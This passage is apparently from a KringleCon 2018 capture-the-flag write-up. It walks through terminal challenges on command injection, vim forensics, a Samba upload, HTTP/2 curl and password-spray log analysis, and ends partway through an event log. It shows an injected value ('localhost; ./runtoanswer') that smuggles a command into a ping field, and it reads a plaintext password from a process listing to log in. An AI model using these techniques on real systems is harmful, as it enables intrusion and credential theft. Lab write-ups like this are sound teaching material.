INSERT INTO "onboard" VALUES(168,'William','McCoy','1019 Benson Park Drive',NULL,'Newcastle','73065','405-387-6925','williammmccoy@superrito.com');
INSERT INTO "onboard" VALUES(169,'Stephanie','Jaynes','1854 Tycos Dr',NULL,'Toronto','M5T 1T4','416-605-0198','stephaniejjaynes@rhyta.com');
COMMIT;
onboard.db: SQLite 3.x database
Press Enter to continue...:  
```

Repeating this process one more time, but this time running `./runtoanswer` and entering the name `Scott` as seen in the dump finishes the challenge:

```
Validating data store for employee onboard information.
Enter address of server: localhost; ./runtoanswer
PING localhost (127.0.0.1) 56(84) bytes of data.
64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from localhost (127.0.0.1): icmp_seq=2 ttl=64 time=0.042 ms
64 bytes from localhost (127.0.0.1): icmp_seq=3 ttl=64 time=0.043 ms

--- localhost ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2026ms
rtt min/avg/max/mdev = 0.034/0.039/0.043/0.008 ms
Loading, please wait......



Enter Mr. Chan's first name: Scott


                                                                                
    .;looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooool:'    
  'ooooooooooookOOooooxOOdodOOOOOOOdoxOOdoooooOOkoooooooxO000Okdooooooooooooo;  
 'oooooooooooooXMWooooOMMxodMMNKKKKxoOMMxoooooWMXoooookNMWK0KNMWOooooooooooooo; 
 :oooooooooooooXMWooooOMMxodMM0ooooooOMMxoooooWMXooooxMMKoooooKMMkooooooooooooo 
 coooooooooooooXMMMMMMMMMxodMMWWWW0ooOMMxoooooWMXooooOMMkoooookMM0ooooooooooooo 
 coooooooooooooXMWdddd0MMxodMM0ddddooOMMxoooooWMXooooOMMOoooooOMMkooooooooooooo 
 coooooooooooooXMWooooOMMxodMMKxxxxdoOMMOkkkxoWMXkkkkdXMW0xxk0MMKoooooooooooooo 
 cooooooooooooo0NXooookNNdodXNNNNNNkokNNNNNNOoKNNNNNXookKNNWNXKxooooooooooooooo 
 cooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo 
 cooooooooooooooooooooooooooooooooooMYcNAMEcISooooooooooooooooooooooooooooooooo
 cddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddo 
 OMMMMMMMMMMMMMMMNXXWMMMMMMMNXXWMMMMMMWXKXWMMMMWWWWWWWWWMWWWWWWWWWMMMMMMMMMMMMW 
 OMMMMMMMMMMMMW:  .. ;MMMk'     .NMX:.  .  .lWO         d         xMMMMMMMMMMMW 
 OMMMMMMMMMMMMo  OMMWXMMl  lNMMNxWK  ,XMMMO  .MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMX.  .cOWMN  'MMMMMMM;  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMMMKo,   KN  ,MMMMMMM,  WMMMMMc  KMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMKNMMMO  oM,  dWMMWOWk  cWMMMO  ,MMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 OMMMMMMMMMMMMc ...  cWMWl.  .. .NMk.  ..  .oMMMMM. .MMMMMMM, .MMMMMMMMMMMMMMMW 
 xXXXXXXXXXXXXXKOxk0XXXXXXX0kkkKXXXXXKOkxkKXXXXXXXKOKXXXXXXXKO0XXXXXXXXXXXXXXXK 
 .oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo, 
  .looooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo,  
    .,cllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc;.    
                                                                                

Congratulations!

onboard.db: SQLite 3.x database
Press Enter to continue...: 
```

## Lethal ForensicELFication

[https://docker.kringlecon.com/?challenge=viminfo](https://docker.kringlecon.com/?challenge=viminfo)

```
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
   .,.   ,. .......,.  .',..'',,..:::::,,;:c:::ccooooodxkkOOkOO0KKXXXNNWMMMMMMM
   ldd: .d' ';... .o:  .d;.;:....'dl,;do,:lloc:codddodOOxxk0KOOKKKKXNNNWMMMMMMM
   lo.ol.d' ';'..  ,d'.lc..;:,,,.'docod:,:l:locldlddokOxdxxOK0OKKKXXXNNWMMMMMMM
   lo  lod' ';      co:o...;:....'dl':dl,:l::oodlcddoxOkxxk0KOOKKKKXNNNWMMMMMMM
   ,,   ,;. ......  .;:....',,,,''c:'':l;;c:;:llccoooodkkOOOkOO0KKKXNNNWMMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM
                       ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM

Christmas is coming, and so it would seem,
ER (Elf Resources) crushes elves' dreams.
One tells me she was disturbed by a bloke.
He tells me this must be some kind of joke.

Please do your best to determine what's real.
Has this jamoke, for this elf, got some feels?
Lethal forensics ain't my cup of tea;
If YOU can fake it, my hero you'll be.

One more quick note that might help you complete,
Clearing this mess up that's now at your feet.
Certain text editors can leave some clue.
Did our young Romeo leave one for you?

- Tangle Coalbox, ER Investigator

  Find the first name of the elf of whom a love poem 
  was written.  Complete this challenge by submitting 
  that name to runtoanswer.
elf@e3906b9b8921:~$ 
```

The hint for this challenge is that we're supposed to look for remenants left by a text editor (`vim` in this case). Doing some file listing on the machine shows that there is a poem located at `~/.secrets/her/poem.txt` without the name `NEVERMORE`. Looking a little bit further we see that there is a `~/.viminfo` file which lists a global replace of `Elinore` with `NEVERMORE`.

```
lf@e3906b9b8921:~$ cat .viminfo 
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=utf-8


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536607201,,"r .secrets/her/poem.txt"
:q
|2,0,1536606844,,"q"
...
```

Entering this name into `./runtoanswer` completes the challenge:

```
elf@e3906b9b8921:~$ ./runtoanswer 
Loading, please wait......



Who was the poem written about? Elinore


WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 

Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!
```

## Stall Mucking Report

[https://docker.kringlecon.com/?challenge=plaintext-creds](https://docker.kringlecon.com/?challenge=plaintext-creds)

```
l,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kxc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkxc,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkxl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkl;,,c,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,o:,,,,,,,,,,,
kkkkkkkkkkok0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0K;,,,,,,,,,,
kkkkkkkkkkOXXd,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dXXl,,,,,,,,,,
kkkkkkkkkkOXXXk:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,;,,,,,dXXXc,,,,,,,,,,
kkkkkkkkkkk0XXXXk:,,k:,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,:K:,,l0XXXO,,,,,,,,,,,
kkkkkkkkkkkk0XXXXXOkXx,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,xX0xKXXXXk,,,,,,,,,,,,
kkkkkkkkkkkkkOKXXXXXXXkxddo;,,,,,,,,,,,,,,,,,,,,,,,,cddxkXXXXXXXkc,,,,,,,,,,,,,
kkkkkkkkkkkkkkkk00KXXXXXkl,,,,,,,,,,,,oKOc,,,,,,,,,,,:xXXXX0kdc;,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkKXXXKx:,,,,,,,,;dKXXXX0l,,,,,,,,cxXXXXk,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkk0XXXXX0xoc;,;dKXXXXXXXX0l;:cokKXXXXKo,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkk0KXXXXXXXXXXXXXXXXXXXXXXXXXXXXKkl,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkOO00XXXXXXXXXXXXXXXXXXXxc:;,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkO0XNWWNNXXXXXXXXXXNNWWN0o,,,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkO0XWMMMMMMNXXXXXXXNWMMMMMMNKo,,,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkk0XXWMMMMMMMMNXXXXXXWMMMMMMMMNX0c,,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkOKXXNMMMMMMMMMWXXXXXNMMMMMMMMMWXXXx,,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkOXXXXNMMMMMMMMMMXXXXXNMMMMMMMMMWXXXXk,,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkKXXXXNMMMMXl:dWWXXXXXNMXl:dWMMMWXXXXXd,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkk0XXXXXXNMMMo   KNXXXXXXNo   KMMMNXXXXXX;,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkKXXXXXXXNWMM0kKNXXXXXXXXN0kXMMWNXXXXXXXo,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkXXXXXXXXXXNNNNXXXX0xxKXXXXNNNNXXXXXXXXXx,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkXXXXXXXXXXXXXXXXX'    oXXXXXXXXXXXXXXXXd,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXX.    cXXXXXXXXXXXXXXXXc,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkOXXXXXXXXXXXXXXXXXdllkXXXXXXXXXXXXXXXXk,,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXkl,,,,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXOkkkl;,,,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkOXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXKkkkkkkko;,,,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkk0XXXXXXXXXXXXXXXXXXXXXXXXXXXKOkkkkkkkkkkd:,,,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkOKXXXXXXXXXXXXXXXXXXXXXXKOkkkkkkkkkkkkkkd:,,,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkO0KXXXXXXXXXXXXXXK0Okkkkkkkkkkkkkkkkkkkd:,,,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOO000000OOkkkkkkkkkkkkkkkkkkkkkkkkkkxc,,,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,,,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkxl,,
kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;

Thank you Madam or Sir for the help that you bring!
I was wondering how I might rescue my day.
Finished mucking out stalls of those pulling the sleigh,
My report is now due or my KRINGLE's in a sling!

There's a samba share here on this terminal screen.
What I normally do is to upload the file,
With our network credentials (we've shared for a while).
When I try to remember, my memory's clean!

Be it last night's nog bender or just lack of rest,
For the life of me I can't send in my report.
Could there be buried hints or some way to contort,
Gaining access - oh please now do give it your best!

-Wunorse Openslae


Complete this challenge by uploading the elf's report.txt
file to the samba share at //localhost/report-upload/
```

The goal for this challenge was to find a password and then use it to upload a file to a samba share. As expected, the password was easily found in a process listing, and then it was a simple one-liner to upload a file using that password with the `smbclient` command line utility:

```
elf@96307d2d1106:~$ ps aux | cat
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0  17952  2976 pts/0    Ss   20:35   0:00 /bin/bash /sbin/init
root        10  0.0  0.0  45320  3172 pts/0    S    20:35   0:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
root        11  0.0  0.0  45320  3088 pts/0    S    20:35   0:00 sudo -E -u manager /usr/bin/python /home/manager/report-check.py
root        15  0.0  0.0  45320  3108 pts/0    S    20:35   0:00 sudo -u elf /bin/bash
manager     16  0.0  0.0  33848  8200 pts/0    S    20:35   0:00 /usr/bin/python /home/manager/report-check.py
manager     17  0.0  0.0   9500  2592 pts/0    S    20:35   0:00 /bin/bash /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
elf         18  0.0  0.0  18208  3304 pts/0    S    20:35   0:00 /bin/bash
root        23  0.0  0.0 316664 15292 ?        Ss   20:35   0:00 /usr/sbin/smbd
root        24  0.0  0.0 308372  5488 ?        S    20:35   0:00 /usr/sbin/smbd
root        25  0.0  0.0 308364  4460 ?        S    20:35   0:00 /usr/sbin/smbd
root        27  0.0  0.0 316664  5720 ?        S    20:35   0:00 /usr/sbin/smbd
manager     31  0.0  0.0   4196   676 pts/0    S    20:38   0:00 sleep 60
elf         33  0.0  0.0  36636  2820 pts/0    R+   20:38   0:00 ps aux
elf         34  0.0  0.0   4336   684 pts/0    S+   20:38   0:00 cat
elf@96307d2d1106:~$ ls -al
total 24
drwxr-xr-x 1 elf  elf  4096 Dec 14 16:32 .
drwxr-xr-x 1 root root 4096 Dec 14 16:32 ..
-rw-r--r-- 1 elf  elf   220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf  3543 Dec 14 16:32 .bashrc
-rw-r--r-- 1 elf  elf   675 May 15  2017 .profile
-rw-r--r-- 1 elf  elf   513 Jan  8 20:35 report.txt
elf@96307d2d1106:~$ smbclient -U report-upload%directreindeerflatterystable //localhost/report-upload/ -c 'put report.txt'
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
putting file report.txt as \report.txt (250.5 kb/s) (average 250.5 kb/s)
elf@96307d2d1106:~$ 
                                                                               
                               .;;;;;;;;;;;;;;;'                               
                             ,NWOkkkkkkkkkkkkkkNN;                             
                           ..KM; Stall Mucking ,MN..                           
                         OMNXNMd.             .oMWXXM0.                        
                        ;MO   l0NNNNNNNNNNNNNNN0o   xMc                        
                        :MO                         xMl             '.         
                        :MO   dOOOOOOOOOOOOOOOOOd.  xMl             :l:.       
 .cc::::::::;;;;;;;;;;;,oMO  .0NNNNNNNNNNNNNNNNN0.  xMd,,,,,,,,,,,,,clll:.     
 'kkkkxxxxxddddddoooooooxMO   ..'''''''''''.        xMkcccccccllllllllllooc.   
 'kkkkxxxxxddddddoooooooxMO  .MMMMMMMMMMMMMM,       xMkcccccccllllllllllooool  
 'kkkkxxxxxddddddoooooooxMO   '::::::::::::,        xMkcccccccllllllllllool,   
 .ooooollllllccccccccc::dMO                         xMx;;;;;::::::::lllll'     
                        :MO  .ONNNNNNNNXk           xMl             :lc'       
                        :MO   dOOOOOOOOOo           xMl             ;.         
                        :MO   'cccccccccccccc:'     xMl                        
                        :MO  .WMMMMMMMMMMMMMMMW.    xMl                        
                        :MO    ...............      xMl                        
                        .NWxddddddddddddddddddddddddNW'                        
                          ;ccccccccccccccccccccccccc;                          
                                                                               

You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
```

## CURLing Master

[https://docker.kringlecon.com/?challenge=http2](https://docker.kringlecon.com/?challenge=http2)

```
                                                                               
                                                                               
                  .....................................                        
                 ...',,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'....                      
                 ...,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,'...                     
                  ......'''''''''''''''''''''''',,,,,,,'...                    
                     ............................',,,,,,,...                   
                                                ...,,,,,,'...                  
                                                 ..',,,,,,'..                  
                                                 ...,,,,,,,...                 
                                                 ...,,,,,,,...                 
            ........................................,,,,,,,'......             
         .....''''''''''''''''''''''''''''''''''''',,,,,,,,,,'''.....          
        ...............................................................        
        ...............................................................        
      .:llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllc.       
     .llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll;      
    'llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     
   .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk:    
   o0000000000000000000000000000000000000000000000000000000000000000000000O    
   O00000000000000000000000000000000000000000000000000000000000000000000000'   
   O00000000000000000000000000000000000000000000000000000000000000000000000'   
   d0000000000000000000000000000000000000000000000000000000000000000000000O.   
   'OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOc    
    ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:     
     ,llllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll:      
      .clllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllll'       
        'clllllllllllllllllllllllllllllllllllllllllllllllllllllllllll,         
          .,clllllllllllllllllllllllllllllllllllllllllllllllllllll;.           
              .';:cllllllllllllllllllllllllllllllllllllllllcc;,..              
                                                                               


I am Holly Evergreen, and now you won't believe:
Once again the striper stopped; I think I might just leave!
Bushy set it up to start upon a website call.
Darned if I can CURL it on - my Linux skills apall.

Could you be our CURLing master - fixing up this mess?
If you are, there's one concern you surely must address.
Something's off about the conf that Bushy put in place.
Can you overcome this snag and save us all some face?

  Complete this challenge by submitting the right HTTP 
  request to the server at http://localhost:8080/ to 
  get the candy striper started again. You may view 
  the contents of the nginx.conf file in 
  /etc/nginx/, if helpful.
elf@40c9af7d617e:~$ 
```

This problem here is to interact with a webserver which only runs HTTP2 and doesn't respond to standard HTTP1.x commands. Simply running curl against localhost seems to fail off the bat:

```
$ curl http://localhost:8080/   
   ����elf@40c9af7d617e:~$ 
elf@40c9af7d617e:~$ 
```

However, if we dive into the curl manpage we see that there is an option for `--http2-prior-knowledge` which will skip the `HTTP 1.1` upgrade step and go straight to `HTTP2`. Running curl again with this argument gives us the webpage and prompts us to submit a POST request with `status=on`. Doing the latter again completes the challenge.

```
elf@40c9af7d617e:~$ curl --http2-prior-knowledge http://localhost:8080/
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

 
 </body>
</html>
elf@40c9af7d617e:~$ curl --http2-prior-knowledge http://localhost:8080/ -d 'status=on'
<html>
 <head>
  <title>Candy Striper Turner-On'er</title>
 </head>
 <body>
 <p>To turn the machine on, simply POST to this URL with parameter "status=on"

                                                                                
                                                                okkd,          
                                                               OXXXXX,         
                                                              oXXXXXXo         
                                                             ;XXXXXXX;         
                                                            ;KXXXXXXx          
                                                           oXXXXXXXO           
                                                        .lKXXXXXXX0.           
  ''''''       .''''''       .''''''       .:::;   ':okKXXXXXXXX0Oxcooddool,   
 'MMMMMO',,,,,;WMMMMM0',,,,,;WMMMMMK',,,,,,occccoOXXXXXXXXXXXXXxxXXXXXXXXXXX.  
 'MMMMN;,,,,,'0MMMMMW;,,,,,'OMMMMMW:,,,,,'kxcccc0XXXXXXXXXXXXXXxx0KKKKK000d;   
 'MMMMl,,,,,,oMMMMMMo,,,,,,lMMMMMMd,,,,,,cMxcccc0XXXXXXXXXXXXXXOdkO000KKKKK0x. 
 'MMMO',,,,,;WMMMMMO',,,,,,NMMMMMK',,,,,,XMxcccc0XXXXXXXXXXXXXXxxXXXXXXXXXXXX: 
 'MMN,,,,,,'OMMMMMW;,,,,,'kMMMMMW;,,,,,'xMMxcccc0XXXXXXXXXXXXKkkxxO00000OOx;.  
 'MMl,,,,,,lMMMMMMo,,,,,,cMMMMMMd,,,,,,:MMMxcccc0XXXXXXXXXXKOOkd0XXXXXXXXXXO.  
 'M0',,,,,;WMMMMM0',,,,,,NMMMMMK,,,,,,,XMMMxcccckXXXXXXXXXX0KXKxOKKKXXXXXXXk.  
 .c.......'cccccc.......'cccccc.......'cccc:ccc: .c0XXXXXXXXXX0xO0000000Oc     
                                                    ;xKXXXXXXX0xKXXXXXXXXK.    
                                                       ..,:ccllc:cccccc:'      
                                                                               

Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
<p>Congratulations! You've won and have successfully completed this challenge.
<p>POSTing data in HTTP/2.0.

 </body>
</html>
elf@40c9af7d617e:~$ 
```

## Yule Log Analysis

[https://docker.kringlecon.com/?challenge=spray-detect](https://docker.kringlecon.com/?challenge=spray-detect)

```
                                                                                
                             .;:cccckkxdc;.                                     
                         .o0xc;,,,,,XMMMMMkc:,.                                 
                       lXMMMX;,,,,,,XMMMMK,,coddcclOkxoc,.                      
                     lk:oNMMMX;,,,,,XMMWN00o:,,,,,:MMMMMMoc;'                   
                   .0l,,,,dNMMX;,,,,XNNWMMMk,,,,,,:MMMMMx,,,,:;.                
                  .K;,,,,,,,xWMX;,,;Kx:kWMMMk,,,,,:MMMM0,,,,,,,:k'              
                 .XklooooddolckWN:l0:,,,;kWMMO,,,,:MMMN;,,,,,cOWMMd             
               ;oooc;,,,cMMMMMMxkO0,,,,,,,:OMM0,,,:MMWc,,,,lKMMMMWKo            
            ;OMMWl,,,,,,cMMMMMO,,,:cc,,,,,,,:0M0,,:MMd,,,oXMMWKxc,,,c           
          cOdXMMMWl,,,,,cMMMMX,,,,,,,:xxo:,,,,cK0,:MO,;xNWKxc,,,,,,,:.          
        .0l,,,oNMMWl,,,,cMMMW:,,,,,,dXMWNMWXOdc;lxcX:xOxc,,,,,,,,,,,,:          
       ,0;,,,,,,dNMWo,,,cMMMl,,,,;xNMMMMW0kkkkkkddxdddxxxxxxxxxxxxxxxo          
      .Wl,,,,,,,,,dWMo,,cMMx,,,:OWMMW0xc,:c,,:dOkcK:kc:ok0NMMMMMMMMMMd          
      KMMWXOdl;,,,,;xWd,cM0,,l0MW0dc,,,,,,lkWWk:,OW,:XO:,,,;ldOXWMMMM'          
     'MMMMMMMMMN0ko:,;kdcN;o00dc,,,,,,,,,,,0x;,,oMW,,;XWk;,,,,,,,:okk           
     cNKKKKKKKKKKKKKKkoodxxdccccccccccccccco,,,:WMW,,,;XMWk;,,,,,,,l            
     :x,,,,,,,,,,,,,cdkoOldldOKWMMMMMMMMMMMx,,,XMMW,,,,;XMMWx,,,,;c             
     .K,,,,,,,,,cd0WKl,xN,oXo,,,:ok0NMMMMMMc,,OMMMW,,,,,;KMMMNd;l'              
      dl,,,,cx0WMM0c,,lMN,,oMXl,,,,,,;ldOX0',dMMMMW,,,,,,;KMMMK;                
       OoxKWMMMWk:,,,;NMN,,,lWMKc,,,,,,,,ldclWMMMMW,,,,,,:oOl.                  
        OMMMMNx;,,,,,KMMN,,,,lWMM0c,,,,,l. .,cdkO00ccc:;,.                      
         cWXo,,,,,,,kMMMN,,,,,cWMMM0:,c:                                        
          .Kc,,,,,,:MMMMN,,,,,,dMMMMWk'                                         

I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
"Password spraying" is to blame for this our grinchly fate.
Should we blame our password policies which users hate?

Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...

  Submit the compromised webmail username to 
  runtoanswer to complete this challenge.
elf@da627e451ca0:~$ 
```

This challenge contained an event log and python script I was entirely unfamiliar with. Using the tools to dump the event log to XML and search through them showed that 

```
elf@da627e451ca0:~$ ls -al
total 9136
drwxr-xr-x 1 elf  elf     4096 Jan  8 20:50 .
drwxr-xr-x 1 root root    4096 Dec 14 16:42 ..
-rw-r--r-- 1 elf  elf      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 elf  elf     3785 Dec 14 16:42 .bashrc
-rw-r--r-- 1 elf  elf      807 Apr  4  2018 .profile
-rw-r--r-- 1 elf  elf     1353 Dec 14 16:13 evtx_dump.py
-rw-r--r-- 1 elf  elf  1118208 Dec 14 16:13 ho-ho-no.evtx
-rwxr-xr-x 1 elf  elf  5936968 Dec 14 16:13 runtoanswer
elf@da627e451ca0:~$ python evtx_dump.py ho-ho-no.evtx > dump.txt
elf@da627e451ca0:~$ 
```

Looking through the dump shows a lot of login attempts with different usernames on the IP address `172.31.254.101`. A couple examples are given:

```
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
<TimeCreated SystemTime="2018-09-10 12:54:56.034510"></TimeCreated>
<EventRecordID>238011</EventRecordID>
<Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""></Correlation>
<Execution ProcessID="664" ThreadID="15648"></Execution>
<Channel>Security</Channel>
<Computer>WIN-KCON-EXCH16.EM.KRINGLECON.COM</Computer>
<Security UserID=""></Security>
</System>
<EventData><Data Name="SubjectUserSid">S-1-5-18</Data>
<Data Name="SubjectUserName">WIN-KCON-EXCH16$</Data>
<Data Name="SubjectDomainName">EM.KRINGLECON</Data>
<Data Name="SubjectLogonId">0x00000000000003e7</Data>
<Data Name="TargetUserSid">S-1-0-0</Data>
<Data Name="TargetUserName">test.user</Data>
<Data Name="TargetDomainName">EM.KRINGLECON</Data>
<Data Name="Status">0xc000006d</Data>
<Data Name="FailureReason">%%2313</Data>
<Data Name="SubStatus">0xc0000064</Data>
<Data Name="LogonType">8</Data>
<Data Name="LogonProcessName">Advapi  </Data>
<Data Name="AuthenticationPackageName">Negotiate</Data>
<Data Name="WorkstationName">WIN-KCON-EXCH16</Data>
<Data Name="TransmittedServices">-</Data>
<Data Name="LmPackageName">-</Data>
<Data Name="KeyLength">0</Data>
<Data Name="ProcessId">0x00000000000019f0</Data>
<Data Name="ProcessName">C:\Windows\System32\inetsrv\w3wp.exe</Data>
<Data Name="IpAddress">172.31.254.101</Data>
<Data Name="IpPort">40634</Data>
</EventData>

</Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"></Provider>
<EventID Qualifiers="">4625</EventID>
<Version>0</Version>
<Level>0</Level>
<Task>12544</Task>
<Opcode>0</Opcode>
<Keywords>0x8010000000000000</Keywords>
